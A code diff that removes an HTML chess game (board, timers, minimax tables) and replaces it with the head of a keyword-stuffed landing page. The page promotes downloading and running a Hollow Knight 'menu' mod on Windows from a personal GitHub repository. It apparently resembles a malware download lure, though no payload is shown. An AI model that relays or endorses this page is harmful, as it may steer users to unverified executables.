@@ -1,1459 +1,228 @@
 <!DOCTYPE html>
-<html lang="en" class="h-full">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>24Chess</title>
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- ADD YOUR FAVICON TAG HERE -->
-   <link rel="icon" type="image/png" href="favicon.png">
-    <!--apple favicone poop -->
-    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
-    <!-- FontAwesome Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['Plus Jakarta Sans', 'sans-serif'],
-                    },
-                }
-            }
-        }
-    </script>
-    <style>
-        /* Custom Board Themes */
-        .theme-wood .sq-light { background-color: #f0d9b5; color: #b58863; }
-        .theme-wood .sq-dark { background-color: #b58863; color: #f0d9b5; }
-        .theme-wood .sq-highlight { background-color: rgba(246, 246, 105, 0.8) !important; }
-        .theme-wood .sq-lastmove { background-color: rgba(205, 210, 106, 0.6) !important; }
-
-        .theme-dark .sq-light { background-color: #2e3440; color: #4c566a; }
-        .theme-dark .sq-dark { background-color: #4c566a; color: #2e3440; }
-        .theme-dark .sq-highlight { background-color: rgba(136, 192, 208, 0.6) !important; }
-        .theme-dark .sq-lastmove { background-color: rgba(94, 129, 172, 0.6) !important; }
-
-        .theme-emerald .sq-light { background-color: #e2e8f0; color: #059669; }
-        .theme-emerald .sq-dark { background-color: #059669; color: #e2e8f0; }
-        .theme-emerald .sq-highlight { background-color: rgba(52, 211, 153, 0.7) !important; }
-        .theme-emerald .sq-lastmove { background-color: rgba(16, 185, 129, 0.5) !important; }
-
-        .theme-neon .sq-light { background-color: #1e1b4b; color: #ec4899; }
-        .theme-neon .sq-dark { background-color: #312e81; color: #ec4899; }
-        .theme-neon .sq-highlight { background-color: rgba(236, 72, 153, 0.7) !important; }
-        .theme-neon .sq-lastmove { background-color: rgba(168, 85, 247, 0.6) !important; }
-
-        /* Board grid wrapper setup */
-        #chessboard-wrapper {
-            position: relative;
-            width: 100%;
-            height: 100%;
-        }
-
-        /* Ensure uniform square dimensions */
-        .board-square {
-            aspect-ratio: 1 / 1;
-            width: 100%;
-            height: 100%;
-            position: relative;
-        }
-
-        /* Smooth Piece Animations (Chess.com style) */
-        .chess-piece {
-            position: absolute;
-            width: 12.5%;
-            height: 12.5%;
-            top: 0;
-            left: 0;
-            cursor: grab;
-            user-select: none;
-            -webkit-user-select: none;
-            transition: transform 0.22s cubic-bezier(0.2, 0, 0, 1);
-            will-change: transform;
-            z-index: 20;
-            pointer-events: none;
-        }
-
-        .chess-piece:active {
-            cursor: grabbing;
-        }
-
-        .square-selected {
-            box-shadow: inset 0 0 0 4px #eab308 !important;
-        }
-
-        /* Move indicators */
-        .move-dot {
-            width: 28%;
-            height: 28%;
-            border-radius: 50%;
-            background-color: rgba(0, 0, 0, 0.25);
-            pointer-events: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-        .capture-ring {
-            width: 88%;
-            height: 88%;
-            border-radius: 50%;
-            border: 4px solid rgba(0, 0, 0, 0.25);
-            pointer-events: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
-        /* Scrollbar styling */
-        ::-webkit-scrollbar {
-            width: 6px;
-            height: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: rgba(0, 0, 0, 0.1);
-            border-radius: 4px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: rgba(255, 255, 255, 0.4);
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>hollow-knight-newest-menu - A Fresh Look for Godhome</title>
+<meta name="description" content="hollow-knight-newest-menu is a Hollow Knight mod that refreshes your Godhome experience. A simple, beginner-friendly guide to download and run it on Windows in minutes.">
+<meta name="keywords" content="hollow-knight, hollow-knight-mod, hollow-knight-silksong, hollow knight mod, godhome mod, hollow knight menu mod, hollow knight windows download">
+<meta name="author" content="hollow-knight-newest-menu">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/landeroro3698/hollow-knight-newest-menu">
+<meta property="og:type" content="website">
+<meta property="og:title" content="hollow-knight-newest-menu - A Fresh Look for Godhome">
+<meta property="og:description" content="A Hollow Knight mod that improves your Godhome experience. Follow the simple Windows guide to download and start playing.">
+<meta property="og:url" content="https://github.com/landeroro3698/hollow-knight-newest-menu">
+<meta property="og:site_name" content="hollow-knight-newest-menu">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="hollow-knight-newest-menu - A Fresh Look for Godhome">
+<meta name="twitter:description" content="A Hollow Knight mod that improves your Godhome experience. Simple Windows download guide for beginners.">
+<style>
+  * { box-sizing: border-box; }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    margin: 0;
+    background: #f5f4f9;
+    color: #1f2233;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    letter-spacing: 0.1px;
+  }
+  h1, h2, h3 { color: #16182b; line-height: 1.25; letter-spacing: -0.3px; }
+  h1 { font-size: 34px; margin: 0 0 14px; }
+  h2 { font-size: 24px; margin: 40px 0 12px; }
+  h3 { font-size: 19px; margin: 24px 0 8px; }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 22px; }
+  li { margin-bottom: 10px; }
+  a { color: #6d28d9; }
+  .btn {
+    display: inline-block;
+    padding: 16px 30px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #7c3aed 0%, #f97316 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 18px;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(124, 58, 237, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(124, 58, 237, 0.42);
+  }
+  .btn-wrap { margin: 26px 0 10px; }
+  .note {
+    background: #ffffff;
+    border-left: 4px solid #f97316;
+    border-radius: 10px;
+    padding: 16px 20px;
+    box-shadow: 0 6px 18px rgba(22, 24, 43, 0.07);
+    margin: 0 0 20px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 22px 26px;
+    box-shadow: 0 8px 22px rgba(22, 24, 43, 0.08);
+    margin: 0 0 22px;
+  }
+  .steps li { margin-bottom: 14px; }
+  footer {
+    margin-top: 48px;
+    padding: 24px 0 8px;
+    border-top: 1px solid #e2dff0;
+    font-size: 14px;
+    color: #5c5f78;
+  }
+  @media (max-width: 620px) {
+    body { font-size: 16px; }
+    .wrap { padding: 24px 18px 40px; }
+    h1 { font-size: 27px; }
+    h2 { font-size: 21px; }
+    .card { padding: 18px 18px; }
+    .btn { display: block; text-align: center; font-size: 17px; }
+  }
+</style>
 </head>
-<body class="h-full bg-slate-950 text-slate-100 font-sans flex flex-col justify-between overflow-x-hidden selection:bg-amber-500 selection:text-slate-900">
-
-    <!-- Header / Navbar -->
-    <header class="bg-slate-900/80 backdrop-blur-md border-b border-slate-800 px-4 py-3 sticky top-0 z-30">
-        <div class="max-w-7xl mx-auto flex items-center justify-between">
-            <div class="flex items-center space-x-3">
-                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-amber-500 to-amber-300 flex items-center justify-center text-slate-950 shadow-lg shadow-amber-500/20">
-                    <i class="fa-solid fa-chess-king text-2xl"></i>
-                </div>
-                <div>
-                    <h1 class="text-xl font-extrabold tracking-tight bg-gradient-to-r from-white via-slate-200 to-slate-400 bg-clip-text text-transparent">24Chess</h1>
-                    <p class="text-xs text-slate-400 font-medium">Chess For School</p>
-                </div>
-            </div>
-
-            <!-- Header Controls -->
-            <div class="flex items-center space-x-2 sm:space-x-4">
-                <button id="btn-sound" class="p-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 transition" title="Toggle Sound">
-                    <i class="fa-solid fa-volume-high text-lg"></i>
-                </button>
-                <button id="btn-new-game" class="px-4 py-2 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-sm shadow-md shadow-amber-500/20 transition flex items-center space-x-2">
-                    <i class="fa-solid fa-rotate-right"></i>
-                    <span class="hidden sm:inline">New Game</span>
-                </button>
-            </div>
-        </div>
-    </header>
-
-    <!-- Main Container -->
-    <main class="flex-1 max-w-7xl w-full mx-auto p-2 sm:p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
-        
-        <!-- Left Panel: Settings & Player Cards (3 cols on desktop) -->
-        <div class="lg:col-span-3 flex flex-col gap-4 order-2 lg:order-1">
-            <!-- Game Mode & Settings Card -->
-            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 shadow-xl">
-                <h2 class="text-xs font-bold uppercase tracking-wider text-slate-400 mb-3 flex items-center gap-2">
-                    <i class="fa-solid fa-sliders text-amber-500"></i> Match Settings
-                </h2>
-                
-                <div class="space-y-3">
-                    <!-- Mode Selection -->
-                    <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1">Game Mode</label>
-                        <select id="select-mode" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-amber-500">
-                            <option value="ai">vs Computer (AI)</option>
-                            <option value="pvp">Pass & Play (Local 2P)</option>
-                        </select>
-                    </div>
-
-                    <!-- AI Difficulty -->
-                    <div id="ai-difficulty-container">
-                        <label class="block text-xs font-medium text-slate-400 mb-1">AI Difficulty</label>
-                        <select id="select-difficulty" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-amber-500">
-                            <option value="easy">Easy (Casual)</option>
-                            <option value="medium" selected>Medium (Tactical)</option>
-                            <option value="hard">Hard (Minimax Engine)</option>
-                        </select>
-                    </div>
-
-                    <!-- Board Theme -->
-                    <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1">Board Theme</label>
-                        <select id="select-theme" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-amber-500">
-                            <option value="wood" selected>Classic Wood</option>
-                            <option value="dark">Modern Dark</option>
-                            <option value="emerald">Emerald Green</option>
-                            <option value="neon">Neon Cyber</option>
-                        </select>
-                    </div>
-
-                    <!-- Clock Setup -->
-                    <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1">Clock / Timer</label>
-                        <select id="select-timer" class="w-full bg-slate-800 border border-slate-700 rounded-xl px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-amber-500">
-                            <option value="0">Untimed</option>
-                            <option value="180">3 Minutes Blitz</option>
-                            <option value="300" selected>5 Minutes Standard</option>
-                            <option value="600">10 Minutes Rapid</option>
-                        </select>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Player Top / Opponent Box -->
-            <div id="player-top-card" class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 shadow-xl flex items-center justify-between">
-                <div class="flex items-center space-x-3">
-                    <div class="w-10 h-10 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-lg">
-                        <i id="player-top-icon" class="fa-solid fa-robot text-indigo-400"></i>
-                    </div>
-                    <div>
-                        <div id="player-top-name" class="font-bold text-sm text-slate-200">Computer</div>
-                        <div id="top-captured" class="flex flex-wrap gap-0.5 mt-1 text-xs text-slate-400 h-4 min-w-[100px]"></div>
-                    </div>
-                </div>
-                <div id="top-timer" class="text-xl font-mono font-extrabold bg-slate-950 px-3 py-1.5 rounded-xl border border-slate-800 text-slate-300">
-                    05:00
-                </div>
-            </div>
-
-            <!-- Player Bottom Box -->
-            <div id="player-bottom-card" class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 shadow-xl flex items-center justify-between">
-                <div class="flex items-center space-x-3">
-                    <div class="w-10 h-10 rounded-full bg-amber-500/20 border border-amber-500/30 flex items-center justify-center text-lg">
-                        <i id="player-bottom-icon" class="fa-solid fa-user text-amber-400"></i>
-                    </div>
-                    <div>
-                        <div id="player-bottom-name" class="font-bold text-sm text-slate-200">You (White)</div>
-                        <div id="bottom-captured" class="flex flex-wrap gap-0.5 mt-1 text-xs text-slate-400 h-4 min-w-[100px]"></div>
-                    </div>
-                </div>
-                <div id="bottom-timer" class="text-xl font-mono font-extrabold bg-slate-950 px-3 py-1.5 rounded-xl border border-slate-800 text-slate-300">
-                    05:00
-                </div>
-            </div>
-        </div>
-
-        <!-- Center Panel: The Chess Board (6 cols on desktop) -->
-        <div class="lg:col-span-6 flex flex-col items-center justify-center order-1 lg:order-2">
-            <div id="board-container" class="w-full max-w-[560px] aspect-square relative rounded-2xl shadow-2xl p-2 bg-slate-900 border border-slate-800">
-                <!-- Status Banner -->
-                <div id="game-status" class="absolute -top-10 left-0 right-0 text-center font-bold text-sm tracking-wide text-amber-400 h-6">
-                    White's Turn
-                </div>
-
-                <!-- Chess Board Grid and Piece Layer -->
-                <div id="chessboard-wrapper" class="rounded-xl overflow-hidden shadow-inner theme-wood border border-slate-700/50">
-                    <div id="chessboard" class="w-full h-full grid grid-cols-8">
-                        <!-- 64 Squares dynamically rendered -->
-                    </div>
-                    <div id="piece-layer" class="absolute inset-0 pointer-events-none">
-                        <!-- Animated piece elements dynamically rendered here -->
-                    </div>
-                </div>
-            </div>
-
-            <!-- Board Toolbar -->
-            <div class="flex items-center justify-center gap-3 mt-4 w-full max-w-[560px]">
-                <button id="btn-undo" class="flex-1 py-2.5 px-4 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl font-semibold text-xs sm:text-sm text-slate-300 transition flex items-center justify-center gap-2">
-                    <i class="fa-solid fa-rotate-left"></i> Undo
-                </button>
-                <button id="btn-flip" class="flex-1 py-2.5 px-4 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl font-semibold text-xs sm:text-sm text-slate-300 transition flex items-center justify-center gap-2">
-                    <i class="fa-solid fa-arrow-rotate-right"></i> Flip Board
-                </button>
-                <button id="btn-resign" class="flex-1 py-2.5 px-4 bg-slate-900 hover:bg-rose-950/40 border border-slate-800 hover:border-rose-900/50 rounded-xl font-semibold text-xs sm:text-sm text-rose-400 transition flex items-center justify-center gap-2">
-                    <i class="fa-solid fa-flag"></i> Resign
-                </button>
-            </div>
-        </div>
-
-        <!-- Right Panel: Move History (3 cols on desktop) -->
-        <div class="lg:col-span-3 flex flex-col order-3 h-full">
-            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col h-[400px] lg:h-[580px]">
-                <div class="flex items-center justify-between pb-3 border-b border-slate-800 mb-3">
-                    <h2 class="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
-                        <i class="fa-solid fa-list-ol text-amber-500"></i> Move History
-                    </h2>
-                    <span id="move-count" class="text-xs font-semibold px-2 py-0.5 rounded-full bg-slate-800 text-slate-400">0 Moves</span>
-                </div>
-
-                <!-- Move List Scrollable -->
-                <div id="move-history-container" class="flex-1 overflow-y-auto pr-1">
-                    <table class="w-full text-xs text-left text-slate-300">
-                        <thead class="text-[10px] uppercase text-slate-500 sticky top-0 bg-slate-900 pb-1">
-                            <tr>
-                                <th scope="col" class="py-1 px-2 w-12">#</th>
-                                <th scope="col" class="py-1 px-2">White</th>
-                                <th scope="col" class="py-1 px-2">Black</th>
-                            </tr>
-                        </thead>
-                        <tbody id="move-history-table" class="divide-y divide-slate-800/50">
-                            <!-- Moves added programmatically -->
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-    </main>
-
-    <!-- Pawn Promotion Modal -->
-    <div id="promotion-modal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center hidden">
-        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl max-w-sm w-full text-center">
-            <h3 class="text-lg font-bold text-slate-100 mb-1">Pawn Promotion</h3>
-            <p class="text-xs text-slate-400 mb-4">Select a piece to promote your pawn:</p>
-            <div id="promotion-options" class="grid grid-cols-4 gap-3">
-                <!-- Promotion Piece Options generated dynamically -->
-            </div>
-        </div>
-    </div>
-
-    <!-- Game Over Modal -->
-    <div id="gameover-modal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-sm z-50 flex items-center justify-center hidden">
-        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl max-w-sm w-full text-center">
-            <div class="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center justify-center mx-auto mb-4 text-3xl">
-                <i id="gameover-icon" class="fa-solid fa-trophy"></i>
-            </div>
-            <h3 id="gameover-title" class="text-xl font-extrabold text-slate-100 mb-1">Checkmate!</h3>
-            <p id="gameover-desc" class="text-sm text-slate-400 mb-6">White wins the game.</p>
-            <button id="btn-modal-restart" class="w-full py-3 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold rounded-xl shadow-lg shadow-amber-500/20 transition">
-                Play Again
-            </button>
-        </div>
-    </div>
-
-    <!-- Web Audio Synthesizer Script -->
-    <script>
-        // Audio Synthesizer Class using Web Audio API
-        class ChessAudio {
-            constructor() {
-                this.ctx = null;
-                this.muted = false;
-            }
-
-            init() {
-                if (!this.ctx) {
-                    const AudioContext = window.AudioContext || window.webkitAudioContext;
-                    this.ctx = new AudioContext();
-                }
-            }
-
-            play(type) {
-                if (this.muted) return;
-                this.init();
-                if (this.ctx.state === 'suspended') {
-                    this.ctx.resume();
-                }
-
-                const now = this.ctx.currentTime;
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-
-                if (type === 'move') {
-                    osc.type = 'sine';
-                    osc.frequency.setValueAtTime(320, now);
-                    osc.frequency.exponentialRampToValueAtTime(160, now + 0.08);
-                    gain.gain.setValueAtTime(0.3, now);
-                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.08);
-                    osc.start(now);
-                    osc.stop(now + 0.08);
-                } else if (type === 'capture') {
-                    osc.type = 'triangle';
-                    osc.frequency.setValueAtTime(450, now);
-                    osc.frequency.exponentialRampToValueAtTime(120, now + 0.12);
-                    gain.gain.setValueAtTime(0.4, now);
-                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
-                    osc.start(now);
-                    osc.stop(now + 0.12);
-                } else if (type === 'check') {
-                    osc.type = 'square';
-                    osc.frequency.setValueAtTime(600, now);
-                    osc.frequency.setValueAtTime(800, now + 0.08);
-                    gain.gain.setValueAtTime(0.15, now);
-                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.2);
-                    osc.start(now);
-                    osc.stop(now + 0.2);
-                } else if (type === 'gameover') {
-                    osc.type = 'sine';
-                    osc.frequency.setValueAtTime(400, now);
-                    osc.frequency.setValueAtTime(520, now + 0.15);
-                    osc.frequency.setValueAtTime(660, now + 0.3);
-                    gain.gain.setValueAtTime(0.3, now);
-                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.5);
-                    osc.start(now);
-                    osc.stop(now + 0.5);
-                }
-            }
-        }
-        const audio = new ChessAudio();
-    </script>
-
-    <!-- Main Game Logic Engine -->
-    <script>
-        // Constants & Piece Definitions
-        const PIECES = {
-            'P': { type: 'p', color: 'w', symbol: '♟', fontIcon: 'fa-chess-pawn' },
-            'R': { type: 'r', color: 'w', symbol: '♜', fontIcon: 'fa-chess-rook' },
-            'N': { type: 'n', color: 'w', symbol: '♞', fontIcon: 'fa-chess-knight' },
-            'B': { type: 'b', color: 'w', symbol: '♝', fontIcon: 'fa-chess-bishop' },
-            'Q': { type: 'q', color: 'w', symbol: '♛', fontIcon: 'fa-chess-queen' },
-            'K': { type: 'k', color: 'w', symbol: '♚', fontIcon: 'fa-chess-king' },
-            'p': { type: 'p', color: 'b', symbol: '♙', fontIcon: 'fa-chess-pawn' },
-            'r': { type: 'r', color: 'b', symbol: '♖', fontIcon: 'fa-chess-rook' },
-            'n': { type: 'n', color: 'b', symbol: '♘', fontIcon: 'fa-chess-knight' },
-            'b': { type: 'b', color: 'b', symbol: '♗', fontIcon: 'fa-chess-bishop' },
-            'q': { type: 'q', color: 'b', symbol: '♕', fontIcon: 'fa-chess-queen' },
-            'k': { type: 'k', color: 'b', symbol: '♔', fontIcon: 'fa-chess-king' }
-        };
-
-        // Material Evaluation Tables for Minimax AI
-        const PIECE_VALUES = { p: 100, n: 320, b: 330, r: 500, q: 900, k: 20000 };
-
-        const PAWN_TABLE = [
-            0,  0,  0,  0,  0,  0,  0,  0,
-            50, 50, 50, 50, 50, 50, 50, 50,
-            10, 10, 20, 30, 30, 20, 10, 10,
-             5,  5, 10, 25, 25, 10,  5,  5,
-             0,  0,  0, 20, 20,  0,  0,  0,
-             5, -5,-10,  0,  0,-10, -5,  5,
-             5, 10, 10,-20,-20, 10, 10,  5,
-             0,  0,  0,  0,  0,  0,  0,  0
-        ];
-
-        const KNIGHT_TABLE = [
-            -50,-40,-30,-30,-30,-30,-40,-50,
-            -40,-20,  0,  0,  0,  0,-20,-40,
-            -30,  0, 10, 15, 15, 10,  0,-30,
-            -30,  5, 15, 20, 20, 15,  5,-30,
-            -30,  0, 15, 20, 20, 15,  0,-30,
-            -30,  5, 10, 15, 15, 10,  5,-30,
-            -40,-20,  0,  5,  5,  0,-20,-40,
-            -50,-40,-30,-30,-30,-30,-40,-50
-        ];
-
-        const BISHOP_TABLE = [
-            -20,-10,-10,-10,-10,-10,-10,-20,
-            -10,  0,  0,  0,  0,  0,  0,-10,
-            -10,  0,  5, 10, 10,  5,  0,-10,
-            -10,  5,  5, 10, 10,  5,  5,-10,
-            -10,  0, 10, 10, 10, 10,  0,-10,
-            -10, 10, 10, 10, 10, 10, 10,-10,
-            -10,  5,  0,  0,  0,  0,  5,-10,
-            -20,-10,-10,-10,-10,-10,-10,-20
-        ];
-
-        const ROOK_TABLE = [
-              0,  0,  0,  0,  0,  0,  0,  0,
-              5, 10, 10, 10, 10, 10, 10,  5,
-             -5,  0,  0,  0,  0,  0,  0, -5,
-             -5,  0,  0,  0,  0,  0,  0, -5,
-             -5,  0,  0,  0,  0,  0,  0, -5,
-             -5,  0,  0,  0,  0,  0,  0, -5,
-             -5,  0,  0,  0,  0,  0,  0, -5,
-              0,  0,  0,  5,  5,  0,  0,  0
-        ];
-
-        const QUEEN_TABLE = [
-            -20,-10,-10, -5, -5,-10,-10,-20,
-            -10,  0,  0,  0,  0,  0,  0,-10,
-            -10,  0,  5,  5,  5,  5,  0,-10,
-             -5,  0,  5,  5,  5,  5,  0, -5,
-              0,  0,  5,  5,  5,  5,  0, -5,
-            -10,  5,  5,  5,  5,  5,  0,-10,
-            -10,  0,  5,  0,  0,  0,  0,-10,
-            -20,-10,-10, -5, -5,-10,-10,-20
-        ];
-
-        // State variables
-        let board = [];
-        let pieceElementsMap = new Map(); // Unique IDs tracking DOM piece elements across moves
-        let pieceIdCounter = 0;
-        let turn = 'w'; // 'w' or 'b'
-        let selectedSquare = null;
-        let validMoves = [];
-        let history = [];
-        let castlingRights = { w: { k: true, q: true }, b: { k: true, q: true } };
-        let enPassantTarget = null;
-        let isFlipped = false;
-        let gameMode = 'ai'; // 'ai' or 'pvp'
-        let aiDifficulty = 'medium'; // 'easy', 'medium', 'hard'
-        let gameActive = true;
-        let capturedPieces = { w: [], b: [] };
-        
-        // Timer state
-        let timeControl = 300; // in seconds
-        let whiteTime = 300;
-        let blackTime = 300;
-        let timerInterval = null;
-
-        // Initial Board Setup Standard FEN
-        const INITIAL_FEN = "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1";
-
-        // Initializer
-        function initGame() {
-            pieceElementsMap.clear();
-            const pieceLayer = document.getElementById('piece-layer');
-            if (pieceLayer) pieceLayer.innerHTML = '';
-            parseFEN(INITIAL_FEN);
-            selectedSquare = null;
-            validMoves = [];
-            history = [];
-            castlingRights = { w: { k: true, q: true }, b: { k: true, q: true } };
-            enPassantTarget = null;
-            gameActive = true;
-            capturedPieces = { w: [], b: [] };
-            
-            // Set Timers
-            const selectedTimer = parseInt(document.getElementById('select-timer').value, 10);
-            timeControl = selectedTimer;
-            whiteTime = selectedTimer;
-            blackTime = selectedTimer;
-            
-            stopTimer();
-            updateTimerDisplay();
-            if (timeControl > 0) startTimer();
-
-            renderBoard();
-            updateUI();
-        }
-
-        // FEN Parser
-        function parseFEN(fen) {
-            board = Array(64).fill(null);
-            const [placement, activeColor, castling, enpassant] = fen.split(' ');
-            let r = 0, c = 0;
-            for (let char of placement) {
-                if (char === '/') {
-                    r++;
-                    c = 0;
-                } else if (/\d/.test(char)) {
-                    c += parseInt(char, 10);
-                } else {
-                    const pieceObj = { code: char, id: ++pieceIdCounter };
-                    board[r * 8 + c] = pieceObj;
-                    c++;
-                }
-            }
-            turn = activeColor;
-        }
-
-        // Helper to convert index to grid position coordinates percentage
-        function getSquareCoordinates(sqIndex) {
-            const index = isFlipped ? 63 - sqIndex : sqIndex;
-            const r = Math.floor(index / 8);
-            const c = index % 8;
-            return { x: c * 100, y: r * 100 };
-        }
-
-        // Generate Board DOM
-        function renderBoard() {
-            const boardEl = document.getElementById('chessboard');
-            const pieceLayer = document.getElementById('piece-layer');
-            boardEl.innerHTML = '';
-
-            const lastMove = history.length > 0 ? history[history.length - 1] : null;
-
-            // Render 64 static board squares
-            for (let i = 0; i < 64; i++) {
-                const sqIndex = isFlipped ? 63 - i : i;
-                const r = Math.floor(sqIndex / 8);
-                const c = sqIndex % 8;
-                const isLight = (r + c) % 2 === 0;
-
-                const squareEl = document.createElement('div');
-                squareEl.className = `board-square flex items-center justify-center font-bold text-lg select-none transition-colors ${
-                    isLight ? 'sq-light' : 'sq-dark'
-                }`;
-                squareEl.dataset.index = sqIndex;
-
-                // Last move highlighting
-                if (lastMove && (lastMove.from === sqIndex || lastMove.to === sqIndex)) {
-                    squareEl.classList.add('sq-lastmove');
-                }
-
-                // Selected square highlighting
-                if (selectedSquare === sqIndex) {
-                    squareEl.classList.add('square-selected');
-                }
-
-                // Coordinate Labels (ranks and files)
-                if ((isFlipped ? c === 7 : c === 0)) {
-                    const rankLabel = document.createElement('span');
-                    rankLabel.className = 'absolute top-0.5 left-1 text-[10px] opacity-60 font-semibold pointer-events-none z-10';
-                    rankLabel.innerText = 8 - r;
-                    squareEl.appendChild(rankLabel);
-                }
-                if ((isFlipped ? r === 0 : r === 7)) {
-                    const fileLabel = document.createElement('span');
-                    fileLabel.className = 'absolute bottom-0.5 right-1 text-[10px] opacity-60 font-semibold pointer-events-none z-10';
-                    fileLabel.innerText = String.fromCharCode(97 + c);
-                    squareEl.appendChild(fileLabel);
-                }
-
-                // Render Move Dots / Rings
-                const isMoveTarget = validMoves.find(m => m.to === sqIndex);
-                if (isMoveTarget) {
-                    const indicator = document.createElement('div');
-                    if (board[sqIndex]) {
-                        indicator.className = 'capture-ring z-10';
-                    } else {
-                        indicator.className = 'move-dot z-10';
-                    }
-                    squareEl.appendChild(indicator);
-                }
-
-                // Square Click Event
-                squareEl.addEventListener('click', () => handleSquareClick(sqIndex));
-                boardEl.appendChild(squareEl);
-            }
-
-            // Render/Update animated pieces layer
-            const activePieceIds = new Set();
-
-            for (let i = 0; i < 64; i++) {
-                const piece = board[i];
-                if (piece) {
-                    activePieceIds.add(piece.id);
-                    const coords = getSquareCoordinates(i);
-                    const pieceObj = PIECES[piece.code];
-                    let pieceEl = pieceElementsMap.get(piece.id);
-
-                    if (!pieceEl) {
-                        pieceEl = document.createElement('div');
-                        pieceEl.className = `chess-piece text-3xl sm:text-4xl md:text-5xl flex items-center justify-center ${
-                            pieceObj.color === 'w' ? 'text-slate-100 drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)]' : 'text-slate-900 drop-shadow-[0_2px_2px_rgba(255,255,255,0.4)]'
-                        }`;
-                        pieceEl.innerHTML = `<i class="fa-solid ${pieceObj.fontIcon}"></i>`;
-                        pieceEl.style.transform = `translate(${coords.x}%, ${coords.y}%)`;
-                        pieceLayer.appendChild(pieceEl);
-                        pieceElementsMap.set(piece.id, pieceEl);
-                    } else {
-                        // Smoothly translate existing piece and ensure correct updated icon (e.g. after pawn promotion)
-                        pieceEl.innerHTML = `<i class="fa-solid ${pieceObj.fontIcon}"></i>`;
-                        pieceEl.className = `chess-piece text-3xl sm:text-4xl md:text-5xl flex items-center justify-center ${
-                            pieceObj.color === 'w' ? 'text-slate-100 drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)]' : 'text-slate-900 drop-shadow-[0_2px_2px_rgba(255,255,255,0.4)]'
-                        }`;
-                        pieceEl.style.transform = `translate(${coords.x}%, ${coords.y}%)`;
-                    }
-                }
-            }
-
-            // Remove captured pieces from DOM
-            pieceElementsMap.forEach((el, id) => {
-                if (!activePieceIds.has(id)) {
-                    el.remove();
-                    pieceElementsMap.delete(id);
-                }
-            });
-        }
-
-        // Handle Player Interactions
-        function handleSquareClick(sqIndex) {
-            if (!gameActive) return;
-            if (gameMode === 'ai' && turn === 'b') return; // Ignore input on AI turn
-
-            const piece = board[sqIndex];
-
-            // If selecting own piece
-            if (piece && getPieceColor(piece.code) === turn) {
